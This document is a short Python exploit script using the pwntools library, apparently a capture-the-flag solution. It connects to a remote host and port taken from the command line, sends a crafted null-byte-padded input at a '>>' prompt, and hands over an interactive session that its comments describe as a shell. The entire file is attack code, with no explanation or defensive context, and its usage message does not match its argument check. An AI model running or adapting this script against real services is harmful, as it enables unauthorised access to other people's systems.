import pwn
import sys

def exploit_binary(remote_connection: pwn.remote):
    remote_connection.recvuntil(">>")
    remote_connection.sendline("\x003tpas\x00")  # Sending the crafted input
    remote_connection.interactive()  # Interact with the shell

def establish_connection():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} REMOTE remote-ip remote-port")
        sys.exit(1)
    return pwn.remote(sys.argv[1], sys.argv[2])  # Establishing remote connection

def main():
    remote_connection = establish_connection()  # Connect to the remote service
    exploit_binary(remote_connection)  # Execute the exploit

if __name__ == "__main__":
    main()  # Run the script